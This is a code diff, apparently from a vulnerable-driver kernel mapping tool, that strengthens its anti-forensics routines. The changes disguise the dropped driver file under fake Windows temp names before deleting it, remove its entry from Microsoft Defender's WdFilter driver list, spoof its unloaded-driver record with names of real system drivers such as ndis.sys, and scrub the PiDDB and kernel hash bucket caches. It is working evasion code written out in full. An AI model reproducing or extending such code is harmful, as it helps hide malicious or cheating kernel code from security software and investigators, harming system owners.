@@ -311,6 +311,16 @@ static ULONG32 PatchDriverTimestamp(const std::wstring& driver_path) {
 	return newTimestamp;
 }
 
+static std::wstring MakeInnocuousName(const std::wstring& dir, const wchar_t* ext) {
+	static const wchar_t hexChars[] = L"0123456789ABCDEF";
+	wchar_t hex[9] = { 0 };
+	for (int i = 0; i < 8; i++)
+		hex[i] = hexChars[kdmUtils::CryptoRand32() & 0xF];
+	static const wchar_t* prefixes[] = { L"WER", L"~DF", L"TMP", L"MSI", L"OLE", L"CBS" };
+	const wchar_t* pfx = prefixes[kdmUtils::CryptoRand32() % _countof(prefixes)];
+	return dir + L"\\" + pfx + hex + ext;
+}
+
 static void SecureDeleteFile(const std::wstring& path) {
 	HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
 	if (hFile != INVALID_HANDLE_VALUE) {
@@ -332,13 +342,36 @@ static void SecureDeleteFile(const std::wstring& path) {
 		CloseHandle(hFile);
 	}
 
+	std::wstring dir = path.substr(0, path.find_last_of(L'\\'));
+	static const wchar_t* exts[] = { L".tmp", L".log", L".dat", L".bak" };
+	std::wstring current = path;
+	for (int rename_pass = 0; rename_pass < 3; rename_pass++) {
+		const wchar_t* ext = exts[kdmUtils::CryptoRand32() % _countof(exts)];
+		std::wstring next = MakeInnocuousName(dir, ext);
+		if (MoveFileW(current.c_str(), next.c_str())) {
+			current = next;
+		}
+	}
+
 	for (int pass = 0; pass < 3; pass++) {
-		if (_wremove(path.c_str()) == 0)
+		if (_wremove(current.c_str()) == 0)
 			break;
 		Sleep(50);
 	}
 
-	std::wstring dir = path.substr(0, path.find_last_of(L'\\'));
+	size_t dir_sep = dir.find_last_of(L'\\');
+	if (dir_sep != std::wstring::npos && dir_sep > 0) {
+		static const wchar_t* dirHexChars = L"0123456789ABCDEF";
+		wchar_t dirHex[9] = { 0 };
+		for (int i = 0; i < 8; i++)
+			dirHex[i] = dirHexChars[kdmUtils::CryptoRand32() & 0xF];
+		std::wstring parent = dir.substr(0, dir_sep);
+		std::wstring renamed_dir = parent + L"\\CBS" + dirHex;
+		if (MoveFileW(dir.c_str(), renamed_dir.c_str())) {
+			RemoveDirectoryW(renamed_dir.c_str());
+			return;
+		}
+	}
 	RemoveDirectoryW(dir.c_str());
 }
 
@@ -789,21 +822,34 @@ bool intel_driver::ClearWdFilterDriverList() {
 			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
 			if (ReadMemory((uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
 				if (wcsstr(ImageName.get(), intel_driver::GetDriverNameW().c_str())) {
-					bool removedRuntimeDriversArray = false;
+					ULONG current = 0;
+					if (!ReadMemory(RuntimeDriversCount, &current, sizeof(ULONG)) || current == 0)
+						return false;
+
+					int my_idx = -1;
 					PVOID SameIndexList = (PVOID)((uintptr_t)Entry - 0x10);
-					for (int k = 0; k < 256; k++) {
+					int scan_max = (int)current;
+					if (scan_max > 2048) scan_max = 2048;
+					for (int k = 0; k < scan_max; k++) {
 						PVOID value = 0;
 						ReadMemory(RuntimeDriversArray + (k * 8), &value, sizeof(PVOID));
 						if (value == SameIndexList) {
-							PVOID emptyval = (PVOID)(RuntimeDriversCount + 1);
-							WriteMemory(RuntimeDriversArray + (k * 8), &emptyval, sizeof(PVOID));
-							removedRuntimeDriversArray = true;
+							my_idx = k;
 							break;
 						}
 					}
 
-					if (!removedRuntimeDriversArray)
+					if (my_idx < 0)
 						return false;
+
+					int last_idx = (int)current - 1;
+					if (my_idx != last_idx) {
+						PVOID tail_value = 0;
+						ReadMemory(RuntimeDriversArray + (last_idx * 8), &tail_value, sizeof(PVOID));
+						WriteMemory(RuntimeDriversArray + (my_idx * 8), &tail_value, sizeof(PVOID));
+					}
+					PVOID zero_slot = nullptr;
+					WriteMemory(RuntimeDriversArray + (last_idx * 8), &zero_slot, sizeof(PVOID));
 
 					auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
 					auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));
@@ -811,15 +857,36 @@ bool intel_driver::ClearWdFilterDriverList() {
 					WriteMemory(uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), &PrevEntry, sizeof(LIST_ENTRY::Blink));
 					WriteMemory(uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), &NextEntry, sizeof(LIST_ENTRY::Flink));
 
-					ULONG current = 0;
-					ReadMemory(RuntimeDriversCount, &current, sizeof(ULONG));
-					current--;
-					WriteMemory(RuntimeDriversCount, &current, sizeof(ULONG));
+					ULONG new_count = current - 1;
+					WriteMemory(RuntimeDriversCount, &new_count, sizeof(ULONG));
 
 					uintptr_t DriverInfo = (uintptr_t)Entry - 0x20;
 					USHORT Magic = 0;
 					ReadMemory(DriverInfo, &Magic, sizeof(USHORT));
-					if (Magic == 0xDA18) {
+
+					bool safe_to_free = false;
+					if (Magic == 0xDA18 && MpFreeDriverInfoEx != 0) {
+						IMAGE_DOS_HEADER dos = { 0 };
+						if (ReadMemory(WdFilter, &dos, sizeof(dos)) && dos.e_magic == IMAGE_DOS_SIGNATURE) {
+							IMAGE_NT_HEADERS64 nt = { 0 };
+							if (ReadMemory(WdFilter + dos.e_lfanew, &nt, sizeof(nt)) && nt.Signature == IMAGE_NT_SIGNATURE) {
+								uintptr_t imgLo = WdFilter;
+								uintptr_t imgHi = WdFilter + nt.OptionalHeader.SizeOfImage;
+								if (MpFreeDriverInfoEx > imgLo && MpFreeDriverInfoEx < imgHi) {
+									uint8_t prologue = 0;
+									if (ReadMemory(MpFreeDriverInfoEx, &prologue, 1)) {
+										if (prologue == 0x40 || prologue == 0x48 || prologue == 0x55 ||
+											prologue == 0x53 || prologue == 0x56 || prologue == 0x57 ||
+											prologue == 0x4C || prologue == 0xE9 || prologue == 0x44 ||
+											prologue == 0x41)
+											safe_to_free = true;
+									}
+								}
+							}
+						}
+					}
+
+					if (safe_to_free) {
 						CallKernelFunction<void>(nullptr, MpFreeDriverInfoEx, DriverInfo);
 					}
 
@@ -962,26 +1029,51 @@ bool intel_driver::ClearMmUnloadedDrivers() {
 		return false;
 
 	UNICODE_STRING us_driver_base_dll_name = { 0 };
-	if (!ReadMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0)
+	if (!ReadMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0 || !us_driver_base_dll_name.Buffer)
 		return false;
 
-	static const wchar_t* spoofNames[] = {
-		L"monitor.sys", L"rdyboost.sys", L"mssmbios.sys", L"intelppm.sys",
-		L"compbatt.sys", L"wmiacpi.sys", L"msisadrv.sys", L"acpiex.sys",
+	static const wchar_t* shortSpoofs[] = {
+		L"cng.sys",     L"mup.sys",     L"afd.sys",     L"hal.sys",
+		L"ndis.sys",    L"null.sys",    L"udfs.sys",    L"http.sys",
+		L"beep.sys",    L"ksecdd.sys",  L"hidusb.sys",  L"acpiex.sys",
+		L"wmiacpi.sys", L"monitor.sys", L"intelppm.sys"
 	};
-	const wchar_t* spoofName = spoofNames[kdmUtils::CryptoRand32() % _countof(spoofNames)];
-	USHORT spoofLen = (USHORT)(wcslen(spoofName) * sizeof(wchar_t));
 
-	if (us_driver_base_dll_name.MaximumLength >= spoofLen + sizeof(wchar_t) && us_driver_base_dll_name.Buffer) {
-		uint64_t bufAddr = (uint64_t)us_driver_base_dll_name.Buffer;
-		WriteMemory(bufAddr, (void*)spoofName, spoofLen + sizeof(wchar_t));
-		us_driver_base_dll_name.Length = spoofLen;
-		WriteMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name));
+	USHORT maxFit = us_driver_base_dll_name.MaximumLength;
+	const wchar_t* spoofName = nullptr;
+	USHORT spoofLen = 0;
+
+	for (int tries = 0; tries < 16; ++tries) {
+		const wchar_t* cand = shortSpoofs[kdmUtils::CryptoRand32() % _countof(shortSpoofs)];
+		USHORT candLen = (USHORT)(wcslen(cand) * sizeof(wchar_t));
+		if (candLen + (USHORT)sizeof(wchar_t) <= maxFit) {
+			spoofName = cand;
+			spoofLen = candLen;
+			break;
+		}
 	}
-	else {
-		us_driver_base_dll_name.Length = 0;
-		WriteMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name));
+
+	if (!spoofName) {
+		for (size_t i = 0; i < _countof(shortSpoofs); ++i) {
+			USHORT candLen = (USHORT)(wcslen(shortSpoofs[i]) * sizeof(wchar_t));
+			if (candLen + (USHORT)sizeof(wchar_t) <= maxFit) {
+				spoofName = shortSpoofs[i];
+				spoofLen = candLen;
+				break;
+			}
+		}
 	}
+
+	if (!spoofName)
+		return false;
+
+	uint64_t bufAddr = (uint64_t)us_driver_base_dll_name.Buffer;
+	if (!WriteMemory(bufAddr, (void*)spoofName, spoofLen + sizeof(wchar_t)))
+		return false;
+
+	us_driver_base_dll_name.Length = spoofLen;
+	if (!WriteMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
+		return false;
 
 	return true;
 }
@@ -1121,13 +1213,6 @@ bool intel_driver::ClearPiDDBCacheTable() {
 		return false;
 	}
 
-	ULONG cacheDeleteCount = 0;
-	ReadMemory((uintptr_t)PiDDBCacheTable + (offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
-	if (cacheDeleteCount > 0) {
-		cacheDeleteCount--;
-		WriteMemory((uintptr_t)PiDDBCacheTable + (offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
-	}
-
 	ExReleaseResourceLite(PiDDBLock);
 	return true;
 }
@@ -1207,51 +1292,45 @@ bool intel_driver::ClearKernelHashBucketList() {
 	}
 
 	std::wstring wdname = GetDriverNameW();
-	std::wstring search_path = GetDriverPath();
-	SIZE_T expected_len = (search_path.length() - 2) * 2;
 
 	while (entry) {
 		USHORT wsNameLen = 0;
-		if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
+		if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen))) {
 			ExReleaseResourceLite(g_HashCacheLock);
 			return false;
 		}
 
-		if (expected_len == wsNameLen) {
+		if (wsNameLen > 0 && wsNameLen < 0x1000) {
 			wchar_t* wsNamePtr = 0;
-			if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
-				ExReleaseResourceLite(g_HashCacheLock);
-				return false;
-			}
+			if (ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) && wsNamePtr) {
+				auto wsName = std::make_unique<wchar_t[]>((ULONG64)wsNameLen / 2ULL + 1ULL);
+				if (ReadMemory((uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
+					wsName[wsNameLen / 2] = 0;
 
-			auto wsName = std::make_unique<wchar_t[]>((ULONG64)wsNameLen / 2ULL + 1ULL);
-			if (!ReadMemory((uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
-				ExReleaseResourceLite(g_HashCacheLock);
-				return false;
-			}
+					if (std::wstring(wsName.get()).find(wdname) != std::wstring::npos) {
+						nt::HashBucketEntry* Next = 0;
+						if (!ReadMemory((uintptr_t)entry, &Next, sizeof(Next))) {
+							ExReleaseResourceLite(g_HashCacheLock);
+							return false;
+						}
 
-			size_t find_result = std::wstring(wsName.get()).find(wdname);
-			if (find_result != std::wstring::npos) {
-				nt::HashBucketEntry* Next = 0;
-				if (!ReadMemory((uintptr_t)entry, &Next, sizeof(Next))) {
-					ExReleaseResourceLite(g_HashCacheLock);
-					return false;
+						if (!WriteMemory((uintptr_t)prev, &Next, sizeof(Next))) {
+							ExReleaseResourceLite(g_HashCacheLock);
+							return false;
+						}
+
+						if (!FreePool((uintptr_t)entry)) {
+							ExReleaseResourceLite(g_HashCacheLock);
+							return false;
+						}
+
+						ExReleaseResourceLite(g_HashCacheLock);
+						return true;
+					}
 				}
-
-				if (!WriteMemory((uintptr_t)prev, &Next, sizeof(Next))) {
-					ExReleaseResourceLite(g_HashCacheLock);
-					return false;
-				}
-
-				if (!FreePool((uintptr_t)entry)) {
-					ExReleaseResourceLite(g_HashCacheLock);
-					return false;
-				}
-
-				ExReleaseResourceLite(g_HashCacheLock);
-				return true;
 			}
 		}
+
 		prev = entry;
 		if (!ReadMemory((uintptr_t)entry, &entry, sizeof(entry))) {
 			ExReleaseResourceLite(g_HashCacheLock);
